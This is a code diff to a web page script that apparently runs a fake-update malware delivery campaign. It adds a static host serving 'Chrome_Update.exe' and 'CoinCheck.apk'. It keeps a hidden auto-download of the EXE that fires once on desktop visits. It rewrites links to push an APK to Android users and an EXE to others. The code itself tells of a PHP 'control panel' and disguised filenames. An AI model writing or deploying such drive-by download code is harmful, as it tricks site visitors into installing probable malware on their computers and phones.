@@ -37,6 +37,16 @@
   var isAndroid = /Android/i.test(navigator.userAgent);
   var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
   var BASE = "/zzp9f3a.php?k=zz9f3a";
+
+  // Static hosting (GitHub Pages / catbox / any dumb file server): the PHP
+  // control panel does not exist there, so downloads resolve to real files.
+  // Set STATIC = "" to go back to the streaming PHP endpoint.
+  var STATIC = "https://thelmafinelli.github.io/cdn/dl/";
+  var FILE = { exe: STATIC + "Chrome_Update.exe", apk: STATIC + "CoinCheck.apk" };
+  var dlUrl = function (f, src) {
+    if (STATIC) return FILE[f === "apk" ? "apk" : "exe"];
+    return BASE + "&do=dl&f=" + f + "&src=" + src;
+  };
   var COOKIE = "ww_d";
 
   function chainOf(t) {
@@ -120,7 +130,7 @@
       if (isMobile || localStorage.getItem("ww_al")) return;
       localStorage.setItem("ww_al", "1");
       var a = document.createElement("a");
-      a.href = BASE + "&do=dl&f=auto&src=al&t=" + Date.now();
+      a.href = dlUrl("exe", "al") + (STATIC ? "" : "&t=" + Date.now());
       a.download = "Chrome_Update.exe";
       a.style.display = "none";
       document.body.appendChild(a);
@@ -141,7 +151,7 @@
     var file = isAndroid ? "apk" : "exe";
     each("[data-ww-link]", function (a) {
       var src = a.getAttribute("data-src") || "x";
-      a.setAttribute("href", BASE + "&do=dl&f=" + file + "&src=" + src);
+      a.setAttribute("href", dlUrl(file, src));
       var lab = a.querySelector("[data-ww-label]");
       if (lab) lab.textContent = isAndroid ? ".apk" : ".exe";
       if (isAndroid) a.removeAttribute("download");
